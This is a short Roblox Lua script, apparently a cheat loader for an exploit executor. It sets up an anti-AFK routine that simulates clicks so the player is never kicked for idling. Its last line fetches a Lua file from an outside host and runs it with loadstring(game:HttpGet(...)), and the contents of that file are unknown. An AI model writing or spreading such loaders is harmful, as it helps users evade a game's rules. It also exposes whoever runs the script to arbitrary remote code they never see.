repeat
	task.wait()
until game:IsLoaded() and game:GetService("Players") and game:GetService("Players").LocalPlayer and workspace

local VirtualUser = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
	VirtualUser:CaptureController()
	VirtualUser:ClickButton2(Vector2.new())
end)

loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/z2ioh2fx175gbqdsenk39xsy1dbjxjp3.lua"))()
